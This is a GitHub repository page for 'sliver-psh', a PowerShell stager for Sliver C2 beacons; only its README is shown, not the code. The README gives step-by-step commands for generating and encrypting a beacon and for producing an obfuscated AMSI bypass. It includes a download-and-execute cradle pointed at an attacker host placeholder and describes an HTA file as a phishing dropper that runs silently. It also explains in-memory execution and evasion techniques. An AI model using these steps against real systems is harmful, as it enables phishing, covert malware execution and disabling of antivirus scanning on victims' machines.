# https://github.com/Chaelsoo/sliver-psh

[Skip to content](https://github.com/Chaelsoo/sliver-psh#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/Chaelsoo/sliver-psh) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/Chaelsoo/sliver-psh) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/Chaelsoo/sliver-psh) to refresh your session.Dismiss alert

{{ message }}

[Chaelsoo](https://github.com/Chaelsoo)/ **[sliver-psh](https://github.com/Chaelsoo/sliver-psh)** Public

- [Notifications](https://github.com/login?return_to=%2FChaelsoo%2Fsliver-psh) You must be signed in to change notification settings
- [Fork\\
0](https://github.com/login?return_to=%2FChaelsoo%2Fsliver-psh)
- [Star\\
2](https://github.com/login?return_to=%2FChaelsoo%2Fsliver-psh)


master

[**1** Branch](https://github.com/Chaelsoo/sliver-psh/branches) [**0** Tags](https://github.com/Chaelsoo/sliver-psh/tags)

[Go to Branches page](https://github.com/Chaelsoo/sliver-psh/branches)[Go to Tags page](https://github.com/Chaelsoo/sliver-psh/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![Chaelsoo](https://avatars.githubusercontent.com/u/67665164?v=4&size=40)](https://github.com/Chaelsoo)[Chaelsoo](https://github.com/Chaelsoo/sliver-psh/commits?author=Chaelsoo)<br>[Add Example](https://github.com/Chaelsoo/sliver-psh/commit/97491411b3597b04fae46c3b54a1b2537278cac7)<br>2 months agoJun 30, 2026<br>[9749141](https://github.com/Chaelsoo/sliver-psh/commit/97491411b3597b04fae46c3b54a1b2537278cac7) · 2 months agoJun 30, 2026<br>## History<br>[3 Commits](https://github.com/Chaelsoo/sliver-psh/commits/master/) <br>Open commit details<br>[View commit history for this file.](https://github.com/Chaelsoo/sliver-psh/commits/master/) 3 Commits |
| [.gitignore](https://github.com/Chaelsoo/sliver-psh/blob/master/.gitignore ".gitignore") | [.gitignore](https://github.com/Chaelsoo/sliver-psh/blob/master/.gitignore ".gitignore") | [Init](https://github.com/Chaelsoo/sliver-psh/commit/74a281b8e9230021787bb291ab5b1d40e8031aa6 "Init") | 2 months agoJun 30, 2026 |
| [README.md](https://github.com/Chaelsoo/sliver-psh/blob/master/README.md "README.md") | [README.md](https://github.com/Chaelsoo/sliver-psh/blob/master/README.md "README.md") | [Edit README](https://github.com/Chaelsoo/sliver-psh/commit/cc2533d13b38b2ff3879a1c9dae3674c9fe0578f "Edit README") | 2 months agoJun 30, 2026 |
| [amsi\_example.ps1](https://github.com/Chaelsoo/sliver-psh/blob/master/amsi_example.ps1 "amsi_example.ps1") | [amsi\_example.ps1](https://github.com/Chaelsoo/sliver-psh/blob/master/amsi_example.ps1 "amsi_example.ps1") | [Add Example](https://github.com/Chaelsoo/sliver-psh/commit/97491411b3597b04fae46c3b54a1b2537278cac7 "Add Example") | 2 months agoJun 30, 2026 |
| [delivery.hta](https://github.com/Chaelsoo/sliver-psh/blob/master/delivery.hta "delivery.hta") | [delivery.hta](https://github.com/Chaelsoo/sliver-psh/blob/master/delivery.hta "delivery.hta") | [Init](https://github.com/Chaelsoo/sliver-psh/commit/74a281b8e9230021787bb291ab5b1d40e8031aa6 "Init") | 2 months agoJun 30, 2026 |
| [encrypt.py](https://github.com/Chaelsoo/sliver-psh/blob/master/encrypt.py "encrypt.py") | [encrypt.py](https://github.com/Chaelsoo/sliver-psh/blob/master/encrypt.py "encrypt.py") | [Init](https://github.com/Chaelsoo/sliver-psh/commit/74a281b8e9230021787bb291ab5b1d40e8031aa6 "Init") | 2 months agoJun 30, 2026 |
| [gen\_amsi.py](https://github.com/Chaelsoo/sliver-psh/blob/master/gen_amsi.py "gen_amsi.py") | [gen\_amsi.py](https://github.com/Chaelsoo/sliver-psh/blob/master/gen_amsi.py "gen_amsi.py") | [Init](https://github.com/Chaelsoo/sliver-psh/commit/74a281b8e9230021787bb291ab5b1d40e8031aa6 "Init") | 2 months agoJun 30, 2026 |
| [stager.ps1](https://github.com/Chaelsoo/sliver-psh/blob/master/stager.ps1 "stager.ps1") | [stager.ps1](https://github.com/Chaelsoo/sliver-psh/blob/master/stager.ps1 "stager.ps1") | [Init](https://github.com/Chaelsoo/sliver-psh/commit/74a281b8e9230021787bb291ab5b1d40e8031aa6 "Init") | 2 months agoJun 30, 2026 |
| View all files |

## Repository files navigation

# sliver-psh

[Permalink: sliver-psh](https://github.com/Chaelsoo/sliver-psh#sliver-psh)

PowerShell stager for Sliver beacons. Downloads an AES-256-CBC encrypted beacon over HTTP, decrypts it in memory, and executes it via a function pointer delegate without touching disk. Includes an AMSI patch to neutralize the scanner in the PowerShell process before the payload runs.

The HTA delivery method documented here is one option. The stager itself works with any delivery that can run a PowerShell download cradle: macro, scheduled task, WinRM, living-off-the-land, whatever fits the engagement.

## Flow

[Permalink: Flow](https://github.com/Chaelsoo/sliver-psh#flow)

**1\. Generate the beacon in Sliver**

```
profiles new --format shellcode --mtls LHOST:443 --skip-symbols beacon-profile
generate --save beacon.bin
```

Specify the port explicitly in `--mtls`. Omitting it defaults to 8888, not 443.

**2\. Encrypt the beacon**

```
python3 encrypt.py beacon.bin beacon_enc.bin
```

Prints the key and IV. Copy both into `stager.ps1` under the config block.

**3\. Generate a fresh AMSI patch**

```
python3 gen_amsi.py --url http://LHOST/stager.ps1 > amsi.ps1
```

Each run produces a new random XOR key, so the output differs every time. The `--url` flag appends the IEX download cradle for `stager.ps1` at the end.

**4\. Update config values**

In `stager.ps1`, set `$LHOST` and paste the key and IV from step 2.

In `delivery.hta`, set `LHOST` if using HTA delivery.

**5\. Serve the files**

```
sudo python3 -m http.server 80
```

The target needs to reach `beacon_enc.bin`, `stager.ps1`, and `amsi.ps1` at the same host.

**6\. Trigger execution on the target**

The entry point is `amsi.ps1`. Deliver it however fits the engagement:

```
IEX(New-Object Net.WebClient).DownloadString('http://LHOST/amsi.ps1')
```

Or via the included HTA dropper, which wraps that cradle in a VBScript `Window_onLoad` handler so it fires the moment `mshta.exe` opens the file.

**7\. Start the mTLS listener in Sliver**

```
mtls --lhost LHOST --lport 443
```

## HTA delivery

[Permalink: HTA delivery](https://github.com/Chaelsoo/sliver-psh#hta-delivery)

`delivery.hta` is a phishing delivery vector. Send the target a link to `http://LHOST/delivery.hta` and `mshta.exe` will open it, fire the PowerShell cradle silently, and close the window. Update `LHOST` in the file before use.

## Files

[Permalink: Files](https://github.com/Chaelsoo/sliver-psh#files)

| File | Purpose |
| --- | --- |
| `delivery.hta` | Optional HTA dropper, update LHOST |
| `amsi.ps1` | Generated AMSI patch, do not commit |
| `stager.ps1` | Stager template, update LHOST, key, IV |
| `encrypt.py` | Encrypts a payload, prints key and IV |
| `gen_amsi.py` | Generates a fresh obfuscated AMSI patch |

`*.bin` files and `amsi.ps1` are gitignored. Regenerate both per engagement.

## Notes

[Permalink: Notes](https://github.com/Chaelsoo/sliver-psh#notes)

The AMSI patch writes `mov eax, 0x80070057; ret` over `AmsiScanBuffer` in the current process, making it return `E_INVALIDARG` and skip the scan. The entire P/Invoke definition is XOR obfuscated so no plaintext signatures appear in the script.

Execution uses `Marshal.GetDelegateForFunctionPointer` rather than `CreateThread`, which avoids the thread creation event and keeps execution on the calling thread.

Memory is allocated RW, the beacon is copied in, then flipped to RX before execution. No RWX region is ever created.

## About

PowerShell stager for Sliver C2 that downloads and decrypts beacons in-memory while bypassing AMSI.

### Resources

[Readme](https://github.com/Chaelsoo/sliver-psh#readme-ov-file)

[Activity](https://github.com/Chaelsoo/sliver-psh/activity)

### Stars

**2** stars

### Watchers

**0** watching

### Forks

[**0** forks](https://github.com/Chaelsoo/sliver-psh/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FChaelsoo%2Fsliver-psh&report=Chaelsoo+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.